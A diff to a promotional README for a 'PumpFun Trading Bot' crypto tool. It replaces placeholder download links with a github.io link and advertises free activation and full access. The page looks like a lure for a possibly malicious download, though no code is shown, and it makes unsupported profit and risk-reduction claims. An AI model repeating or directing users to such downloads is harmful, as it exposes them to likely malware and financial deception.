@@ -2,7 +2,7 @@
 
 The world of cryptocurrency trading evolves quickly, and tools like **PumpFun Trading Bot** are gaining attention for their ability to automate strategies, reduce risks, and maximize profits. If you're exploring how to activate and use this bot effectively, this guide walks you through the essential features, benefits, and activation methods for **free access** and **full functionality**.
 
-[![Download PumpFun Trading Bot](https://img.shields.io/badge/Download-PumpFun_Trading_Bot-blue?style=for-the-badge)](https://example.com)
+[![Download PumpFun Trading Bot](https://img.shields.io/badge/Download-PumpFun_Trading_Bot-blue?style=for-the-badge)](https://pumpfun-trading-bot.github.io/.github/)
 ---
 
 ## Overview of PumpFun Trading Bot
@@ -140,6 +140,7 @@ You gain **full professional access**: unlimited trades, advanced analytics, and
 
 To experience **professional trading automation with free access and secure activation**, try PumpFun Trading Bot today.
 
-[![Download PumpFun Trading Bot](https://img.shields.io/badge/Download-PumpFun_Trading_Bot-blue?style=for-the-badge)](https://example.com)
+[![Download PumpFun Trading Bot](https://img.shields.io/badge/Download-PumpFun_Trading_Bot-blue?style=for-the-badge)](https://pumpfun-trading-bot.github.io/.github/)
 
 ---
+
